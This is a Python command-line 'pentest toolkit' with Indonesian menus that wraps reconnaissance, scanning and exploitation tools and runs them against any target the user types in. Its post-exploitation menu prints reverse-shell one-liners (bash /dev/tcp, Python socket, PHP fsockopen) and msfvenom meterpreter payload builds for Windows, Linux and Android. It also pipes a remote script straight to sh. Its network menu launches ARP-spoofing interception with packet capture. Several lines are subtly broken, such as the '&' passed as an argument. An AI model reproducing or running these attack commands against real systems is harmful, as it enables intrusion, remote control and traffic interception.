#!/usr/bin/env python3
"""
RizkiAs Cyber Toolkit v2.0
Author: RizkiAs
Usage: sudo ./run.py
"""
import os
import sys
import subprocess
import time
import json
import shlex
import shutil
import ipaddress
import threading
from datetime import datetime
from pathlib import Path

# --------------------------------------
# Auto-install colorama / rich jika belum
try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.progress import track
    from rich.prompt import Prompt, Confirm
    from rich.text import Text
    console = Console()
except ImportError:
    subprocess.run([sys.executable, "-m", "pip", "install", "rich", "colorama", "requests", "tqdm"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    from rich.console import Console
    console = Console()

# --------------------------------------
# Banner kamu (TIDAK DIUBAH)
def show_banner():
    print(r"""
‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēó ‚Ėą‚Ėą‚ēó‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēó‚Ėą‚Ėą‚ēó  ‚Ėą‚Ėą‚ēó‚Ėą‚Ėą‚ēó ‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēó ‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēó
‚Ėą‚Ėą‚ēĒ‚ēź‚ēź‚Ėą‚Ėą‚ēó‚Ėą‚Ėą‚ēĎ‚ēö‚ēź‚ēź‚Ėą‚Ėą‚Ėą‚ēĒ‚ēĚ‚Ėą‚Ėą‚ēĎ ‚Ėą‚Ėą‚ēĒ‚ēĚ‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĒ‚ēź‚ēź‚Ėą‚Ėą‚ēó‚Ėą‚Ėą‚ēĒ‚ēź‚ēź‚ēź‚ēź‚ēĚ
‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēĒ‚ēĚ‚Ėą‚Ėą‚ēĎ  ‚Ėą‚Ėą‚Ėą‚ēĒ‚ēĚ ‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēĒ‚ēĚ ‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēó
‚Ėą‚Ėą‚ēĒ‚ēź‚ēź‚Ėą‚Ėą‚ēó‚Ėą‚Ėą‚ēĎ ‚Ėą‚Ėą‚Ėą‚ēĒ‚ēĚ  ‚Ėą‚Ėą‚ēĒ‚ēź‚Ėą‚Ėą‚ēó ‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĒ‚ēź‚ēź‚Ėą‚Ėą‚ēĎ‚ēö‚ēź‚ēź‚ēź‚ēź‚Ėą‚Ėą‚ēĎ
‚Ėą‚Ėą‚ēĎ  ‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēó‚Ėą‚Ėą‚ēĎ  ‚Ėą‚Ėą‚ēó‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚ēĎ  ‚Ėą‚Ėą‚ēĎ‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚Ėą‚ēĎ
‚ēö‚ēź‚ēĚ  ‚ēö‚ēź‚ēĚ‚ēö‚ēź‚ēĚ‚ēö‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēĚ‚ēö‚ēź‚ēĚ  ‚ēö‚ēź‚ēĚ‚ēö‚ēź‚ēĚ‚ēö‚ēź‚ēĚ  ‚ēö‚ēź‚ēĚ‚ēö‚ēź‚ēź‚ēź‚ēź‚ēź‚ēź‚ēĚ
    """)
    print("="*60)
    print("RizkiAs Pentest Toolkit - Professional Edition")
    print("="*60)
    print(f"Time Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("")

# --------------------------------------
# Utility
def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def get_input(prompt, input_type=str, min_val=None, max_val=None):
    while True:
        try:
            user_input = input_type(input(prompt))
            if min_val is not None and user_input < min_val:
                raise ValueError(f"Minimal {min_val}")
            if max_val is not None and user_input > max_val:
                raise ValueError(f"Maksimal {max_val}")
            return user_input
        except ValueError as e:
            print(f"Input tidak valid: {e}")

# --------------------------------------
# Auto-install dependencies
TOOLS = {
    "sublist3r": "apt install sublist3r -y",
    "dirsearch": "apt install dirsearch -y",
    "whatweb": "apt install whatweb -y",
    "nikto": "apt install nikto -y",
    "amass": "apt install amass -y",
    "httpx": "apt install httpx-toolkit -y",
    "sqlmap": "apt install sqlmap -y",
    "wpscan": "apt install wpscan -y",
    "gobuster": "apt install gobuster -y",
    "theHarvester": "apt install theharvester -y",
    "nmap": "apt install nmap -y",
    "curl": "apt install curl -y",
    "nc": "apt install netcat-traditional -y"
}

def install_deps():
    for tool, cmd in TOOLS.items():
        if not shutil.which(tool):
            print(f"[INFO] Installing {tool} ...")
            subprocess.run(cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# --------------------------------------
# JSON Export helper
def save_json(data, filename):
    with open(filename, "w") as f:
        json.dump(data, f, indent=4)
    print(f"[+] Saved -> {filename}")

# --------------------------------------
# CVE Lookup via NIST NVD (basic)
import requests
def cve_lookup(service, version):
    url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={service} {version}"
    try:
        r = requests.get(url, timeout=10)
        r.raise_for_status()
        items = r.json().get("vulnerabilities", [])
        return [v["cve"]["id"] for v in items][:5]
    except Exception:
        return []

# --------------------------------------
# Fast threaded port scanner
def port_scan_threaded(target, ports="1-1000"):
    import concurrent.futures, socket
    open_ports = []
    def scan(port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        if s.connect_ex((target, port)) == 0:
            open_ports.append(port)
        s.close()
    with concurrent.futures.ThreadPoolExecutor(max_workers=200) as executor:
        for p in range(*map(int, ports.split("-"))):
            executor.submit(scan, p)
    return open_ports

# --------------------------------------
# Reconnaissance
def reconnaissance_menu():
    while True:
        clear_screen()
        show_banner()
        print("\n[1] Reconnaissance Tools")
        print("="*40)
        print("1. Whois Lookup")
        print("2. DNS Lookup (nslookup)")
        print("3. Subdomain Enumeration (sublist3r)")
        print("4. Email & Subdomain Harvester (theHarvester)")
        print("5. Tech Stack Scanner (whatweb)")
        print("6. Directory Brute Force (dirsearch)")
        print("7. Simple Port Scan (nmap -sn)")
        print("8. Fast Threaded Port Scan")
        print("9. Kembali ke Menu Utama")
        choice = get_input("Pilih opsi: ", int, 1, 9)
        target = input("Masukkan target (IP/domain): ").strip()
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        if choice == 1:
            out = subprocess.check_output(["whois", target]).decode()
            print(out)
            save_json({"tool":"whois","target":target,"output":out}, f"whois_{target}_{ts}.json")
        elif choice == 2:
            out = subprocess.check_output(["nslookup", target]).decode()
            print(out)
            save_json({"tool":"nslookup","target":target,"output":out}, f"nslookup_{target}_{ts}.json")
        elif choice == 3:
            outfile = f"subdomains_{target}_{ts}.txt"
            subprocess.run(["sublist3r", "-d", target, "-o", outfile])
            print(f"[+] Saved to {outfile}")
        elif choice == 4:
            limit = input("Jumlah hasil (default 100): ") or "100"
            subprocess.run(["theHarvester", "-d", target, "-l", limit, "-b", "all", "-f", f"harvester_{target}_{ts}"])
            print(f"[+] Saved to harvester_{target}_{ts}.xml")
        elif choice == 5:
            out = subprocess.check_output(["whatweb", target]).decode()
            print(out)
            save_json({"tool":"whatweb","target":target,"output":out}, f"whatweb_{target}_{ts}.json")
        elif choice == 6:
            wordlist = input("Path wordlist (default /usr/share/dirb/wordlists/common.txt): ") or "/usr/share/dirb/wordlists/common.txt"
            subprocess.run(["dirsearch", "-u", f"http://{target}", "-w", wordlist])
        elif choice == 7:
            out = subprocess.check_output(["nmap", "-sn", target]).decode()
            print(out)
            save_json({"tool":"nmap_sn","target":target,"output":out}, f"nmap_sn_{target}_{ts}.json")
        elif choice == 8:
            ports = input("Port range (1-1000): ") or "1-1000"
            open_ports = port_scan_threaded(target, ports)
            print(f"[+] Open ports: {open_ports}")
            save_json({"tool":"port_scan","target":target,"ports":open_ports}, f"ports_{target}_{ts}.json")
        elif choice == 9:
            return
        input("\nTekan Enter untuk melanjutkan...")

# --------------------------------------
# Scanning/Enumeration
def scanning_menu():
    while True:
        clear_screen()
        show_banner()
        print("\n[2] Scanning & Enumeration Tools")
        print("="*40)
        print("1. Full Nmap Scan")
        print("2. Nikto Web Server Scan")
        print("3. WPScan (WordPress)")
        print("4. Gobuster Path Brute-force")
        print("5. Amass Advanced Recon")
        print("6. HTTPX Check Live Web")
        print("7. Kembali ke Menu Utama")
        choice = get_input("Pilih opsi: ", int, 1, 7)
        target = input("Masukkan target: ").strip()
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        if choice == 1:
            output = f"nmap_full_{target}_{ts}.txt"
            subprocess.run(["nmap", "-sV", "-O", "-A", "-T4", target, "-oN", output])
            print(f"[+] Saved to {output}")
        elif choice == 2:
            subprocess.run(["nikto", "-h", target])
        elif choice == 3:
            subprocess.run(["wpscan", "--url", target, "--enumerate", "p"])
        elif choice == 4:
            wordlist = input("Wordlist: ") or "/usr/share/dirb/wordlists/common.txt"
            subprocess.run(["gobuster", "dir", "-u", f"http://{target}", "-w", wordlist])
        elif choice == 5:
            outfile = f"amass_{target}_{ts}.txt"
            subprocess.run(["amass", "enum", "-d", target, "-o", outfile])
            print(f"[+] Saved to {outfile}")
        elif choice == 6:
            file = input("Masukkan path file domain: ")
            subprocess.run(["httpx", "-l", file, "-status-code", "-title"])
        elif choice == 7:
            return
        input("\nTekan Enter untuk melanjutkan...")

# --------------------------------------
# Exploitation
def exploitation_menu():
    while True:
        clear_screen()
        show_banner()
        print("\n[3] Exploitation Tools")
        print("="*40)
        print("1. SQLMap (SQL Injection)")
        print("2. XSStrike (XSS)")
        print("3. Commix (Command Injection)")
        print("4. Hydra (Bruteforce Login)")
        print("5. WFuzz (Parameter Fuzzing)")
        print("6. Metasploit Framework")
        print("7. BurpSuite (Manual)")
        print("8. Kembali ke Menu Utama")
        choice = get_input("Pilih opsi: ", int, 1, 8)
        target = input("Masukkan target: ").strip()
        if choice == 1:
            subprocess.run(["sqlmap", "-u", target, "--batch", "--risk=3", "--level=5"])
        elif choice == 2:
            subprocess.run(["python3", "-m", "xsstrike", "-u", target])
        elif choice == 3:
            subprocess.run(["commix", "-u", target])
        elif choice == 4:
            username = input("Username (atau file): ")
            password_list = input("Password list: ")
            service = input("Service (ssh, ftp, http-form-post): ")
            subprocess.run(["hydra", "-L", username, "-P", password_list, target, service])
        elif choice == 5:
            wordlist = input("Wordlist: ")
            subprocess.run(["wfuzz", "-c", "-z", f"file,{wordlist}", "--hc", "404", target])
        elif choice == 6:
            subprocess.run(["msfconsole"])
        elif choice == 7:
            subprocess.run(["burpsuite", "&"])
        elif choice == 8:
            return
        input("\nTekan Enter untuk melanjutkan...")

# --------------------------------------
# Post-Exploitation
def post_exploitation_menu():
    while True:
        clear_screen()
        show_banner()
        print("\n[4] Post-Exploitation Tools")
        print("="*40)
        print("1. Netcat Reverse Shell Helper")
        print("2. MSFVenom Payload Builder")
        print("3. Privilege Escalation Checker")
        print("4. Kembali ke Menu Utama")
        choice = get_input("Pilih opsi: ", int, 1, 4)
        if choice == 1:
            lhost = input("Local IP: ")
            lport = input("Local Port: ")
            shells = {
                1: f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
                2: f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
                3: f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
            }
            for k,v in shells.items():
                print(f"{k}. {v}")
            pick = get_input("Pilih payload: ", int, 1, 3)
            print("[+] Payload:")
            print(shells[pick])
            print(f"Listener: nc -lnvp {lport}")
        elif choice == 2:
            lhost = input("Local IP: ")
            lport = input("Local Port: ")
            payload_choice = get_input("1=Windows exe, 2=Linux elf, 3=Android apk: ", int, 1, 3)
            cmds = {
                1: f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe > payload.exe",
                2: f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf > payload.elf",
                3: f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} R > payload.apk"
            }
            print("Run:\n" + cmds[payload_choice])
        elif choice == 3:
            print("Linux: curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh")
            print("Windows: Invoke-WebRequest ...winPEAS.bat -OutFile winpeas.bat")
        elif choice == 4:
            return
        input("\nTekan Enter untuk melanjutkan...")

# --------------------------------------
# Network & Additional
def network_menu():
    while True:
        clear_screen()
        show_banner()
        print("\n[5] Network & Additional Tools")
        print("="*40)
        print("1. OWASP ZAP")
        print("2. ARP Spoof Helper")
        print("3. Ettercap MITM")
        print("4. Kembali ke Menu Utama")
        choice = get_input("Pilih opsi: ", int, 1, 4)
        if choice == 1:
            subprocess.run(["zap.sh", "&"])
        elif choice == 2:
            target = input("Target IP: ")
            gateway = input("Gateway IP: ")
            iface = input("Interface (eth0/wlan0): ") or "eth0"
            subprocess.Popen(f"arpspoof -i {iface} -t {target} {gateway}", shell=True)
            subprocess.Popen(f"arpspoof -i {iface} -t {gateway} {target}", shell=True)
            subprocess.Popen(f"wireshark -i {iface} -k", shell=True)
            print("Ctrl+C to stop")
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                subprocess.run("pkill arpspoof", shell=True)
        elif choice == 3:
            iface = input("Interface: ") or "eth0"
            target = input("Target IP: ")
            gateway = input("Gateway IP: ")
            subprocess.run(["ettercap", "-T", "-i", iface, "-M", "arp:remote", f"/{gateway}//", f"/{target}//"])
        elif choice == 4:
            return
        input("\nTekan Enter untuk melanjutkan...")

# --------------------------------------
# Main
def main():
    check_root()
    install_deps()
    while True:
        clear_screen()
        show_banner()
        print(" Main Menu ".center(60, "="))
        print("1. Reconnaissance Tools")
        print("2. Scanning & Enumeration")
        print("3. Exploitation Tools")
        print("4. Post-Exploitation")
        print("5. Network & Additional Tools")
        print("6. Exit")
        print("="*60)
        choice = get_input("\nPilih kategori: ", int, 1, 6)
        if choice == 1:
            reconnaissance_menu()
        elif choice == 2:
            scanning_menu()
        elif choice == 3:
            exploitation_menu()
        elif choice == 4:
            post_exploitation_menu()
        elif choice == 5:
            network_menu()
        elif choice == 6:
            print("\n[!] Keluar dari RizkiAs Toolkit...")
            sys.exit(0)

def check_root():
    if os.geteuid() != 0:
        print("[ERROR] Tools ini membutuhkan akses root!")
        print("Jalankan dengan: sudo ./run.py")
        sys.exit(1)

if __name__ == "__main__":
    main()
